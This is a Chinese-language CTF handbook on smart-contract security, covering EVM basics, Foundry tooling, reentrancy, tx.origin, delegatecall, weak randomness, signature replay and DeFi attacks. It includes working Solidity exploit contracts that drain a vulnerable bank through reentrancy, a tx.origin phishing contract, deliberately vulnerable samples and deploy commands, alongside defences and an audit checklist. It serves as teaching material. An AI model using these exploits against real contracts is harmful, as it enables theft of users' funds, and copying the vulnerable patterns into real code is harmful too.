---
title: "区块链入门"
description: "CTF 区块链方向入门手册：区块链与 EVM 基础、Solidity、Foundry、重入、整数溢出、delegatecall、随机数、签名重放、DeFi 攻击与审计清单。"
---

# 区块链入门

> **看懂合约、找到信任裂缝、写一个能跑的 exploit**

区块链安全是在公开账本上寻找智能合约的信任裂缝。本文从区块链与 EVM 基础、Solidity 语法讲到 Foundry 工具链、重入、代理、随机数、签名重放与 DeFi 攻击，并给出完整的重入题演练。

---

### 📑 目录

- [第零章：区块链安全是什么](#第零章区块链安全是什么)
- [第一章：区块链基础](#第一章区块链基础)
- [第二章：以太坊与 EVM](#第二章以太坊与-evm)
- [第三章：Solidity 10 分钟速成](#第三章solidity-10-分钟速成)
- [第四章：环境与工具](#第四章环境与工具)
- [第五章：CTF 区块链题完整流程](#第五章ctf-区块链题完整流程)
- [第六章：重入攻击](#第六章重入攻击)
- [第七章：整数溢出与算术](#第七章整数溢出与算术)
- [第八章：访问控制与 tx.origin](#第八章访问控制与-txorigin)
- [第九章：delegatecall 与代理](#第九章delegatecall-与代理)
- [第十章：随机数与时间](#第十章随机数与时间)
- [第十一章：签名与重放](#第十一章签名与重放)
- [第十二章：DeFi 攻击](#第十二章defi-攻击)
- [第十三章：其他常见漏洞](#第十三章其他常见漏洞)
- [第十四章：Foundry 实战](#第十四章foundry-实战)
- [第十五章：完整演练：重入题从 0 到 flag](#第十五章完整演练重入题从-0-到-flag)
- [第十六章：审计与防御清单](#第十六章审计与防御清单)
- [第十七章：工具链与学习路线](#第十七章工具链与学习路线)

## 第零章：区块链安全是什么

### 0.1 用一句话解释

区块链安全，就是**在不可篡改的公开账本上，找出智能合约逻辑里的信任裂缝**。

传统 Web 题攻击的是服务器；区块链题攻击的是**已经部署在链上的合约**。合约代码公开、交易公开、资金流公开，一旦有漏洞，攻击者可以写一个合约，在同一个交易里把资金拿走。

### 0.2 CTF 区块链题长什么样

通常给你：

- 一个 RPC URL。
- 一个有测试币的私钥。
- 一个目标合约地址。
- 一个 `Setup` 合约，里面有 `isSolved()` 或 `getFlag()`。
- 题目源码或已验证的合约。

你要写一个攻击合约或脚本，让 `isSolved()` 返回 true，然后拿 flag。

### 0.3 需要的基础

| 基础 | 重要程度 | 说明 |
|------|----------|------|
| Solidity | ★★★★★ | 能读懂合约、写简单合约 |
| JavaScript/Python | ★★★★☆ | 写脚本、用 ethers/web3.py |
| Foundry | ★★★★☆ | CTF 主流工具链 |
| 以太坊基础 | ★★★★☆ | 账户、交易、gas、storage |
| DeFi 常识 | ★★★☆☆ | 代币、AMM、借贷、预言机 |
| 密码学 | ★★★☆☆ | 哈希、签名、ECDSA |

> 💡 **不要先学完 Solidity 语法再做区块链题。** 先学“合约怎么存数据、怎么调用别的合约”，然后直接去 Ethernaut 打关卡，遇到不懂的语法再查。

### 0.4 安全底线

只能攻击 CTF 题目链、本地 Anvil 链、测试网和你自己部署的合约。**不要攻击真实主网合约、不要动别人的资金**，这是犯罪。

---

## 第一章：区块链基础

### 1.1 区块链是什么

区块链是一个**只追加**的分布式账本：

```text
区块 N-1 → 区块 N → 区块 N+1
   ↑          ↑          ↑
 交易列表   交易列表    交易列表
   ↑          ↑          ↑
 前一块哈希  前一块哈希   前一块哈希
```

每个区块包含：

- 区块头：前一块哈希、时间戳、状态根、交易根、receipt 根。
- 交易列表。
- 共识信息（PoW 难度 / PoS 验证者）。

### 1.2 哈希与 Merkle 树

- 哈希：把任意数据映射成固定长度指纹，不可逆、抗碰撞。
- Merkle 树：把交易两两哈希，最后得到 Merkle Root，放在区块头里。
- 轻节点只需下载区块头，就能验证某笔交易是否在区块里。

### 1.3 账户模型

以太坊有两种账户：

| 类型 | 说明 | 有代码 |
|------|------|--------|
| EOA（外部账户） | 由私钥控制 | 否 |
| 合约账户 | 由代码控制 | 是 |

EOA 发起交易；合约可以调用其他合约，也可以创建合约。

### 1.4 交易与 gas

一笔交易包含：

```text
from、to、value、data、nonce、gasLimit、maxFeePerGas、maxPriorityFeePerGas、signature
```

- `data` 是调用哪个函数、传什么参数。
- `gas` 是执行消耗的计算量。
- 交易失败会回滚状态，但已消耗的 gas 不退。
- `nonce` 防止重放，按账户递增。

### 1.5 共识

- **PoW**：算力竞争，出块奖励。
- **PoS**：质押 ETH，验证者提议/投票。
- 以太坊 2022 年合并后转为 PoS。

CTF 里不需要深入共识，但要知道：

- 出块时间约 12 秒。
- 交易进入 mempool 后可能被抢跑。
- 重组（reorg）可能影响交易顺序。

---

## 第二章：以太坊与 EVM

### 2.1 EVM 是什么

EVM（Ethereum Virtual Machine）是执行智能合约的虚拟机。它基于栈，数据存在三个地方：

| 区域 | 生命周期 | 说明 |
|------|----------|------|
| Storage | 永久 | 合约的链上状态，32 字节一个 slot |
| Memory | 单次调用 | 临时内存，按字节寻址 |
| Calldata | 单次调用 | 函数参数，只读 |
| Stack | 单次调用 | 最多 1024 个 256 位字 |

### 2.2 合约调用

调用一个函数时，前 4 字节是**函数选择器**：

```text
selector = keccak256("transfer(address,uint256)")[:4]
```

完整 calldata：

```text
selector + ABI 编码的参数
```

例如：

```text
0xa9059cbb
000000000000000000000000000000000000000000000000000000000000dead
0000000000000000000000000000000000000000000000000000000000000064
```

### 2.3 ABI 编码

- 静态类型（`uint256`、`address`、`bool`）固定 32 字节。
- 动态类型（`string`、`bytes`、`array`）有偏移量和长度。
- `abi.encode` 会补齐到 32 字节。
- `abi.encodePacked` 紧密打包，**不补齐**，容易产生哈希碰撞。

### 2.4 存储布局

Solidity 按声明顺序把状态变量放进 slot：

```solidity
contract Example {
    uint256 a;      // slot 0
    uint256 b;      // slot 1
    address c;      // slot 2（低 20 字节）
    bool d;         // slot 2（同一 slot 打包）
    mapping(uint256 => uint256) e; // slot 3（mapping 本身不存数据）
}
```

- 小于 32 字节的变量可以打包进同一个 slot。
- 动态数组和 mapping 的数据存在 `keccak256(key + slot)` 对应的位置。
- `delegatecall` 会沿用调用者的 storage。

### 2.5 创建合约

- `new Contract()`：CREATE，地址 = `keccak256(rlp(sender, nonce))`。
- `CREATE2`：地址 = `keccak256(0xff + sender + salt + keccak256(initCode))`，可预测。
- `CREATE2` 常用于“提前算出地址、往地址打钱、再部署”的套路。

### 2.6 事件与日志

```solidity
event Transfer(address indexed from, address indexed to, uint256 value);
emit Transfer(msg.sender, to, amount);
```

- `indexed` 参数进入 topics，方便过滤。
- 事件不进合约存储，但永久留在链上。

---

## 第三章：Solidity 10 分钟速成

### 3.1 一个最小合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Counter {
    uint256 public count;

    function increment() external {
        count += 1;
    }

    function get() external view returns (uint256) {
        return count;
    }
}
```

### 3.2 类型

| 类型 | 说明 |
|------|------|
| `uint256` / `int256` | 256 位整数 |
| `address` | 20 字节地址 |
| `bool` | 布尔 |
| `bytes` / `bytes32` | 字节 |
| `string` | 字符串 |
| `mapping(K => V)` | 哈希表 |
| `T[]` | 动态数组 |
| `struct` | 结构体 |
| `enum` | 枚举 |

### 3.3 函数可见性

| 关键字 | 说明 |
|--------|------|
| `public` | 内外都可调用 |
| `external` | 只能外部调用 |
| `internal` | 只能内部/子合约 |
| `private` | 只能本合约 |

状态变量还可以用 `public` 自动生成 getter。

### 3.4 修饰器

```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "not owner");
    _;
}

function withdraw() external onlyOwner {
    // ...
}
```

### 3.5 接收 ETH

```solidity
receive() external payable {}
fallback() external payable {}
```

- `receive`：`calldata` 为空时调用。
- `fallback`：没有匹配函数时调用。

### 3.6 调用其他合约

```solidity
interface ITarget {
    function withdraw() external;
}

ITarget(target).withdraw();

// 低层调用
(bool ok, bytes memory data) = target.call{value: 1 ether}(abi.encodeWithSignature("withdraw()"));
require(ok, "call failed");
```

- `call`：普通调用，可转 ETH，可改状态。
- `staticcall`：只读，不能改状态。
- `delegatecall`：用目标代码，改当前合约的 storage。
- `transfer` / `send`：固定 2300 gas，容易失败，现代合约少用。

### 3.7 常用全局变量

| 变量 | 含义 |
|------|------|
| `msg.sender` | 直接调用者 |
| `tx.origin` | 交易发起者（EOA） |
| `msg.value` | 随调用发送的 ETH |
| `block.timestamp` | 当前区块时间 |
| `block.number` | 当前区块号 |
| `block.prevrandao` | 共识层随机值（合并后替代 difficulty） |
| `address(this).balance` | 合约余额 |

> ⚠️ `tx.origin` 是整笔交易的起点，不是直接调用者。用它做权限校验非常危险。

---

## 第四章：环境与工具

### 4.1 Remix

浏览器 IDE，适合快速写合约、部署到测试网、调试。

<https://remix.ethereum.org/>

### 4.2 Foundry

CTF 主流工具链：

| 工具 | 作用 |
|------|------|
| `forge` | 编译、测试、部署、脚本 |
| `cast` | 命令行调用合约、查链上数据 |
| `anvil` | 本地以太坊节点 |
| `chisel` | Solidity REPL |

安装：

```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```

常用命令：

```bash
forge init my-ctf
forge build
forge test -vvv
anvil
forge create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PK
cast call $TARGET "owner()(address)" --rpc-url $RPC
cast send $TARGET "withdraw()" --rpc-url $RPC --private-key $PK
cast storage $TARGET 0 --rpc-url $RPC
cast sig "transfer(address,uint256)"
cast calldata "transfer(address,uint256)" 0xdead 100
```

### 4.3 Hardhat

JavaScript/TypeScript 工具链，插件生态好：

```bash
npm init -y
npm install --save-dev hardhat
npx hardhat init
npx hardhat test
```

### 4.4 脚本库

- **ethers.js**：JavaScript 调用合约。
- **web3.py**：Python 调用合约。
- **viem**：TypeScript 轻量库。

### 4.5 安全分析工具

| 工具 | 用途 |
|------|------|
| Slither | 静态分析，找常见漏洞 |
| Mythril | 符号执行 |
| Echidna | 属性测试 / fuzzing |
| Foundry fuzz | 内置 fuzz 测试 |
| Tenderly | 交易模拟与调试 |
| Etherscan | 看已验证源码、交易、事件 |

### 4.6 学习靶场

- **Ethernaut**：OpenZeppelin 的关卡，最适合入门。
- **Damn Vulnerable DeFi**：DeFi 安全实战。
- **Capture the Ether**：经典入门题。
- **Paradigm CTF**：高质量比赛题。
- **picoCTF Blockchain**：基础题。

---

## 第五章：CTF 区块链题完整流程

### 5.1 拿到连接信息

题目通常给：

```text
RPC URL: http://chall.ctf.com:8545
Private Key: 0x...
Setup Contract: 0x...
Target Contract: 0x...
```

有的题目通过 `/connection_info` 接口返回 JSON。

### 5.2 看合约

- Etherscan / 题目源码 / `cast code`。
- 找 `Setup` 合约的 `isSolved()` 或 `getFlag()`。
- 找目标合约的 `owner`、`balance`、关键函数。

```bash
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC
cast call $TARGET "owner()(address)" --rpc-url $RPC
cast balance $TARGET --rpc-url $RPC
cast code $TARGET --rpc-url $RPC
```

### 5.3 找漏洞

按这个顺序看：

1. 权限：`onlyOwner` 有没有漏、`tx.origin`、`delegatecall`。
2. 资金：`withdraw`、`transfer`、`call{value:}`。
3. 状态更新顺序：先转账还是先改余额。
4. 算术：Solidity 版本、`unchecked`。
5. 随机数：`block.timestamp`、`blockhash`、`prevrandao`。
6. 签名：`ecrecover`、nonce、chainId。
7. 代理：storage 布局、初始化函数。
8. DeFi：价格来源、闪电贷、滑点。

### 5.4 写 exploit

在 Foundry 项目里：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITarget {
    function withdraw() external;
}

contract Exploit {
    ITarget public target;

    constructor(address _target) {
        target = ITarget(_target);
    }

    function attack() external payable {
        target.withdraw();
    }

    receive() external payable {}
}
```

### 5.5 部署并执行

```bash
forge create src/Exploit.sol:Exploit \
  --rpc-url $RPC \
  --private-key $PK \
  --constructor-args $TARGET

cast send $EXPLOIT "attack()" --value 1ether \
  --rpc-url $RPC --private-key $PK
```

### 5.6 检查是否成功

```bash
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC
```

返回 `true` 后，通常会给你 flag，或调用 `getFlag()`。

---

## 第六章：重入攻击

### 6.1 原理

合约在**先转账、后改状态**时，收款方可以在 `receive`/`fallback` 里再次调用原函数，重复提款。

```solidity
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
        balances[msg.sender] = 0; // 太晚了
    }
}
```

### 6.2 攻击合约

```solidity
contract Attacker {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}
```

### 6.3 防御

- **Checks-Effects-Interactions**：先检查、再改状态、最后外部调用。
- 重入锁：

```solidity
bool private locked;
modifier nonReentrant() {
    require(!locked, "reentrant");
    locked = true;
    _;
    locked = false;
}
```

- 使用 OpenZeppelin `ReentrancyGuard`。
- 拉取式提款（pull payment），让用户自己 `withdraw`，而不是主动转账。

---

## 第七章：整数溢出与算术

### 7.1 Solidity < 0.8

```solidity
pragma solidity ^0.7.6;

contract Token {
    mapping(address => uint256) public balanceOf;

    function transfer(address to, uint256 value) public {
        balanceOf[msg.sender] -= value; // 下溢
        balanceOf[to] += value;
    }
}
```

如果余额为 0，减去 1 会变成 `2^256 - 1`。

### 7.2 Solidity ≥ 0.8

编译器自动插入检查，溢出会 revert。除非使用 `unchecked`：

```solidity
unchecked {
    balanceOf[msg.sender] -= value;
}
```

### 7.3 防御

- 使用 Solidity 0.8+。
- 旧版本用 SafeMath。
- 对 `unchecked` 块格外小心。
- 检查加减乘除的边界。

---

## 第八章：访问控制与 tx.origin

### 8.1 缺失权限

```solidity
function setOwner(address newOwner) external {
    owner = newOwner; // 谁都能改
}
```

### 8.2 tx.origin 钓鱼

```solidity
contract Wallet {
    address public owner;

    function withdrawAll(address payable to) external {
        require(tx.origin == owner, "not owner");
        to.transfer(address(this).balance);
    }
}
```

攻击合约：

```solidity
contract Phish {
    Wallet public wallet;

    constructor(address _wallet) {
        wallet = Wallet(_wallet);
    }

    function attack(address payable attacker) external {
        wallet.withdrawAll(attacker);
    }
}
```

受害者调用 `Phish.attack()` 时，`tx.origin` 是受害者，`msg.sender` 是 `Phish`，权限校验被绕过。

### 8.3 防御

- 用 `msg.sender` 做权限，不用 `tx.origin`。
- 使用 OpenZeppelin `Ownable` / `AccessControl`。
- 关键函数加多签/时间锁。

---

## 第九章：delegatecall 与代理

### 9.1 delegatecall 是什么

`delegatecall` 用目标合约的代码，但在**当前合约的 storage** 上执行。

```solidity
contract Proxy {
    address public implementation; // slot 0
    address public admin;          // slot 1

    function forward(bytes calldata data) external {
        (bool ok, ) = implementation.delegatecall(data);
        require(ok, "delegatecall failed");
    }
}
```

### 9.2 storage 冲突

```solidity
contract Logic {
    address public implementation; // slot 0，和 Proxy 冲突
    address public admin;          // slot 1

    function setAdmin(address a) external {
        admin = a;
    }
}
```

如果 `Logic.setAdmin` 通过 `delegatecall` 执行，它会改 Proxy 的 slot 1，也就是 `admin`。

### 9.3 常见代理漏洞

- **未初始化代理**：`initialize()` 谁都能调，攻击者成为 owner。
- **storage 冲突**：代理和逻辑合约变量布局不一致。
- **函数选择器冲突**：代理和逻辑合约有同名函数。
- **任意 delegatecall**：用户能控制目标地址。

### 9.4 EIP-1967

把代理的管理员/实现地址放在 `keccak256` 派生 slot，避开顺序存储：

```text
implementation slot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
admin slot          = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1)
```

### 9.5 防御

- 使用 OpenZeppelin 代理。
- 初始化函数加 `initializer` 修饰器。
- 代理和逻辑合约 storage 布局保持一致。
- 限制 `delegatecall` 目标。

---

## 第十章：随机数与时间

### 10.1 链上没有真随机

```solidity
function guess(uint256 n) external payable {
    require(msg.value == 1 ether);
    uint256 answer = uint256(
        keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))
    ) % 2;
    require(n == answer, "wrong");
    payable(msg.sender).transfer(2 ether);
}
```

攻击合约可以在同一个交易里算出相同的 `answer`，因为所有输入都已知。

### 10.2 常见弱随机源

| 来源 | 问题 |
|------|------|
| `block.timestamp` | 矿工/验证者可小幅操纵 |
| `block.number` | 可预测 |
| `block.prevrandao` | 公开，可被验证者影响 |
| `blockhash` | 只能取最近 256 个块，且公开 |
| `msg.sender` | 攻击者可控 |
| `keccak256` 组合 | 输入公开就能算 |

### 10.3 防御

- 使用 Chainlink VRF 等链下随机源。
- 提交-揭示（commit-reveal）方案。
- 不要把随机数用于高价值场景。

---

## 第十一章：签名与重放

### 11.1 ecrecover

```solidity
function withdraw(
    uint256 amount,
    uint256 nonce,
    uint8 v,
    bytes32 r,
    bytes32 s
) external {
    bytes32 hash = keccak256(abi.encodePacked(address(this), msg.sender, amount, nonce));
    require(ecrecover(hash, v, r, s) == owner, "bad signature");
    // 没有校验 nonce 是否已使用
}
```

### 11.2 重放攻击

如果签名里没有：

- `chainId`：跨链重放。
- `nonce`：同一链重复使用。
- 合约地址：跨合约重放。
- 过期时间：签名永久有效。

攻击者可以把同一份签名再提交一次。

### 11.3 EIP-712

结构化签名，包含 domain separator：

```text
domain = { name, version, chainId, verifyingContract }
```

### 11.4 防御

- 签名包含 `chainId`、合约地址、nonce、deadline。
- 使用 EIP-712。
- 维护已用 nonce 集合。
- 使用 OpenZeppelin `ECDSA` 库，检查 `s` 值范围（防 malleability）。

---

## 第十二章：DeFi 攻击

### 12.1 闪电贷

在同一个交易里借出大量资金、操作、还款，无需抵押。

攻击者常用它：

- 操纵 AMM 价格。
- 放大套利。
- 触发清算。

### 12.2 预言机操纵

如果合约直接用 AMM 的现货 reserves 算价格：

```text
price = reserveA / reserveB
```

攻击者用闪电贷砸盘，价格瞬间偏移，再在受影响协议里获利。

防御：

- 使用 Chainlink 等去中心化预言机。
- 使用 TWAP。
- 检查价格偏差和更新时间。

### 12.3 三明治攻击

```text
受害者买入交易 → 攻击者抢先买入 → 价格上涨 → 攻击者卖出
```

防御：

- 设置滑点保护。
- 使用私有交易通道。
- 分批交易。

### 12.4 其他 DeFi 套路

| 套路 | 说明 |
|------|------|
| 清算操纵 | 操纵抵押品价格触发清算 |
| 捐赠攻击 | 直接向池子转账，改变 share 价格 |
| 首次存款攻击 | 第一个存款人操纵 share 精度 |
| 假代币 | 恶意 ERC20 在回调里重入 |
| 权限过大 | 管理员可任意转走资金 |

---

## 第十三章：其他常见漏洞

### 13.1 强制转账 / selfdestruct

合约可以强制把 ETH 打进另一个合约，即使对方没有 `receive`。

```solidity
selfdestruct(payable(target));
```

> ⚠️ Cancun（EIP-6780）之后，`selfdestruct` 只在**同一交易内创建**的合约上真正删除代码和存储；其他情况只转走余额，合约仍然存在。老题和新链行为可能不同。

### 13.2 create2 与 metamorphic 合约

`CREATE2` 地址可预测。攻击者可以：

1. 预先算出地址。
2. 往地址打钱。
3. 部署合约取走资金。
4. 销毁后用相同 salt 重新部署不同代码（受 EIP-6780 限制）。

### 13.3 abi.encodePacked 碰撞

```solidity
keccak256(abi.encodePacked(a, b))
```

如果 `a`、`b` 是动态类型，不同组合可能拼出相同字节。

防御：用 `abi.encode`。

### 13.4 未检查的低层调用

```solidity
target.call(data); // 忽略了返回值
```

调用失败也继续执行，可能导致状态不一致。

### 13.5 DoS

- 循环遍历不断增长的数组，gas 超限。
- 依赖单个用户的操作，被卡住。
- `transfer` 2300 gas 不够，导致退款失败。

### 13.6 未初始化的 storage 指针

旧版 Solidity 中，未初始化的 storage 指针可能指向 slot 0，覆盖关键变量。

### 13.7 ERC20 approve 竞争

`approve` 直接覆盖 allowance，可能被旧 allowance 抢先花掉。

防御：先归零再设置，或用 `increaseAllowance`。

---

## 第十四章：Foundry 实战

### 14.1 初始化

```bash
forge init blockchain-ctf
cd blockchain-ctf
```

目录：

```text
src/       合约
test/      测试
script/    部署脚本
lib/       依赖
foundry.toml
```

### 14.2 写测试

```solidity
// test/Bank.t.sol
import "forge-std/Test.sol";
import "../src/Bank.sol";

contract BankTest is Test {
    Bank bank;

    function setUp() public {
        bank = new Bank();
        vm.deal(address(this), 10 ether);
    }

    function testDeposit() public {
        bank.deposit{value: 1 ether}();
        assertEq(bank.balances(address(this)), 1 ether);
    }
}
```

```bash
forge test -vvv
```

### 14.3 fork 主网/测试网

```bash
anvil --fork-url $RPC
```

或在测试里：

```solidity
vm.createSelectFork("http://...");
```

### 14.4 部署脚本

```solidity
// script/Exploit.s.sol
import "forge-std/Script.sol";

contract ExploitScript is Script {
    function run() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        address target = vm.envAddress("TARGET");

        vm.startBroadcast(pk);
        new Exploit(target);
        vm.stopBroadcast();
    }
}
```

```bash
forge script script/Exploit.s.sol:ExploitScript \
  --rpc-url $RPC --broadcast
```

### 14.5 cast 常用命令

```bash
cast block-number --rpc-url $RPC
cast balance $ADDRESS --rpc-url $RPC
cast nonce $ADDRESS --rpc-url $RPC
cast call $TARGET "balances(address)(uint256)" $ADDRESS --rpc-url $RPC
cast send $TARGET "deposit()" --value 1ether --rpc-url $RPC --private-key $PK
cast receipt $TXHASH --rpc-url $RPC
cast logs --address $TARGET --rpc-url $RPC
```

---

## 第十五章：完整演练：重入题从 0 到 flag

### 15.1 题目

```solidity
contract Bank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "failed");
        balances[msg.sender] = 0;
    }
}

contract Setup {
    Bank public bank;

    constructor() payable {
        bank = new Bank();
    }

    function isSolved() external view returns (bool) {
        return address(bank).balance == 0;
    }
}
```

### 15.2 分析

- `withdraw` 先转账，后清零。
- 攻击者在 `receive` 里再次调用 `withdraw`。
- 每次都能拿到余额，直到合约被掏空。

### 15.3 写攻击合约

```solidity
contract Exploit {
    Bank public bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}
```

### 15.4 部署

```bash
forge create src/Exploit.sol:Exploit \
  --rpc-url $RPC \
  --private-key $PK \
  --constructor-args $BANK
```

### 15.5 执行

```bash
cast send $EXPLOIT "attack()" --value 1ether \
  --rpc-url $RPC --private-key $PK
```

### 15.6 验证

```bash
cast balance $BANK --rpc-url $RPC
# 0

cast call $SETUP "isSolved()(bool)" --rpc-url $RPC
# true
```

### 15.7 拿 flag

根据题目说明，调用 `getFlag()` 或提交 `isSolved()` 为 true 的证明。

---

## 第十六章：审计与防御清单

### 16.1 合约检查清单

- [ ] 权限函数是否都有 `onlyOwner` / `AccessControl`？
- [ ] 是否使用 `tx.origin` 做权限？
- [ ] 外部调用是否遵循 Checks-Effects-Interactions？
- [ ] 是否有重入锁？
- [ ] 算术是否使用 0.8+ 或 SafeMath？
- [ ] `unchecked` 是否安全？
- [ ] 随机数是否可预测？
- [ ] 签名是否包含 chainId、nonce、deadline？
- [ ] 代理是否初始化？storage 布局是否一致？
- [ ] `delegatecall` 目标是否可控？
- [ ] 低层调用返回值是否检查？
- [ ] 是否有 DoS /  unbounded loop？
- [ ] ERC20 approve 是否存在竞争？
- [ ] 价格来源是否可信？

### 16.2 开发习惯

- 使用 OpenZeppelin 合约。
- 写 Foundry 测试 + fuzz。
- 用 Slither 跑静态分析。
- 重要合约做审计 + 时间锁。
- 先测试网，再主网。

---

## 第十七章：工具链与学习路线

### 17.1 学习路线

```text
区块链基础（账户、交易、gas）
   ↓
Solidity 语法（合约、函数、storage）
   ↓
Foundry（forge/cast/anvil）
   ↓
Ethernaut 前 10 关
   ↓
重入、权限、delegatecall、随机数
   ↓
Ethernaut 全部 + Capture the Ether
   ↓
Damn Vulnerable DeFi
   ↓
Paradigm CTF / 真实审计
```

### 17.2 推荐靶场

| 靶场 | 特点 |
|------|------|
| Ethernaut | 32 关，最适合入门 |
| Damn Vulnerable DeFi | DeFi 实战 |
| Capture the Ether | 经典题型 |
| Paradigm CTF | 高质量比赛 |
| picoCTF Blockchain | 基础题 |
| DeFiHackLabs | 真实攻击复现 |

### 17.3 推荐资料

- Solidity 官方文档：<https://docs.soliditylang.org/>
- Foundry 文档：<https://getfoundry.sh/>
- OpenZeppelin 文档：<https://docs.openzeppelin.com/>
- Ethereum 智能合约安全：<https://ethereum.org/zh/developers/docs/smart-contracts/security/>
- Ethernaut：<https://ethernaut.openzeppelin.com/>
- Damn Vulnerable DeFi：<https://damnvulnerabledefi.xyz/>
- Capture the Ether：<https://capturetheether.com/>
- Paradigm CTF：<https://ctf.paradigm.xyz/>

### 17.4 WP 模板

```markdown
## 题目信息
- 链/网络：
- RPC：
- 目标合约：
- Setup：
- 目标：

## 漏洞分析
1. 合约结构：
2. 漏洞点：
3. 利用思路：

## exploit
（贴合约/脚本）

## 验证
- isSolved：
- flag：
```

---

## 附录 A：速查表

### A.1 Foundry

```bash
forge init
forge build
forge test -vvv
anvil
forge create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PK
cast call $TARGET "owner()(address)" --rpc-url $RPC
cast send $TARGET "withdraw()" --rpc-url $RPC --private-key $PK
cast storage $TARGET 0 --rpc-url $RPC
cast sig "transfer(address,uint256)"
cast calldata "transfer(address,uint256)" 0xdead 100
```

### A.2 常见漏洞

| 漏洞 | 关键词 |
|------|--------|
| 重入 | `call{value:}`、先转账后改状态 |
| 整数溢出 | Solidity < 0.8、`unchecked` |
| 权限缺失 | 没有 `onlyOwner` |
| tx.origin | 钓鱼 |
| delegatecall | storage 冲突、代理 |
| 弱随机 | `block.timestamp`、`blockhash` |
| 签名重放 | 没有 nonce/chainId |
| 价格操纵 | 现货 reserves、闪电贷 |
| 强制转账 | `selfdestruct` |
| 选择器冲突 | 代理/逻辑合约同名函数 |

### A.3 防御关键词

```text
Checks-Effects-Interactions
ReentrancyGuard
Ownable / AccessControl
SafeMath / Solidity 0.8+
Pull Payment
EIP-1967 / EIP-712
Chainlink VRF / TWAP
```

## 附录 B：参考资料

- Solidity Security Considerations：<https://docs.soliditylang.org/en/latest/security-considerations.html>
- Ethereum Smart Contract Security：<https://ethereum.org/zh/developers/docs/smart-contracts/security/>
- Foundry Book：<https://book.getfoundry.sh/>
- OpenZeppelin Contracts：<https://docs.openzeppelin.com/contracts/>
- EIP-1967：<https://eips.ethereum.org/EIPS/eip-1967>
- EIP-712：<https://eips.ethereum.org/EIPS/eip-712>
- EIP-6780：<https://eips.ethereum.org/EIPS/eip-6780>
- Ethernaut：<https://ethernaut.openzeppelin.com/>
- Damn Vulnerable DeFi：<https://damnvulnerabledefi.xyz/>

---

> 📌 **最后一句：** 区块链题的核心不是背漏洞名，而是问三件事：**谁能调用？钱怎么走？状态什么时候改？** 把这三条画清楚，大多数漏洞自己就浮出来了。
